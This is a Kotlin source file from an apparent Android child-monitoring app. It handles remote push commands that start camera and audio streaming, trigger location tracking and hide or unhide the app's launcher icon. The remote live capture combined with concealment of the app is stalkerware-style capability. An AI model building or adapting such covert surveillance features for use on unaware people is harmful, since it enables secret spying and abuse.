package com.nirapod.family.child.receiver

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.nirapod.family.child.service.AudioStreamService
import com.nirapod.family.child.service.CameraStreamService
import com.nirapod.family.child.service.ChildMonitorService
import com.nirapod.family.child.service.ScreenCaptureService
import com.nirapod.family.shared.firebase.FirebaseRepository
import com.nirapod.family.shared.util.Constants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class FCMCommandService : FirebaseMessagingService() {

    private val scope = CoroutineScope(Dispatchers.IO)
    private val firebaseRepo = FirebaseRepository()

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        val prefs = getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)
        val deviceId = prefs.getString(Constants.KEY_DEVICE_ID, null)
        if (deviceId != null) {
            scope.launch {
                // update token
            }
        }
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        val data = remoteMessage.data
        val command = data["command"] ?: return
        val senderId = data["senderId"] ?: ""
        val facing = data["facing"] ?: "front"

        when (command) {
            Constants.CMD_START_CAMERA -> {
                val intent = Intent(this, CameraStreamService::class.java).apply {
                    action = CameraStreamService.ACTION_START
                    putExtra(CameraStreamService.EXTRA_PARENT_ID, senderId)
                    putExtra(CameraStreamService.EXTRA_FACING, facing)
                }
                startService(intent)
            }
            Constants.CMD_START_AUDIO -> {
                val intent = Intent(this, AudioStreamService::class.java).apply {
                    action = AudioStreamService.ACTION_START
                    putExtra(AudioStreamService.EXTRA_PARENT_ID, senderId)
                }
                startService(intent)
            }
            Constants.CMD_STOP_ALL -> {
                stopService(Intent(this, CameraStreamService::class.java))
                stopService(Intent(this, AudioStreamService::class.java))
                stopService(Intent(this, ScreenCaptureService::class.java))
            }
            Constants.CMD_GET_LOCATION -> {
                ChildMonitorService.startService(this)
            }
            Constants.CMD_HIDE_APP -> {
                setAppVisibility(false)
            }
            Constants.CMD_UNHIDE_APP -> {
                setAppVisibility(true)
            }
        }
    }

    private fun setAppVisibility(visible: Boolean) {
        val p = packageManager
        val componentName = ComponentName(this, "com.nirapod.family.child.LauncherAlias")
        val state = if (visible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        p.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP)
    }
}
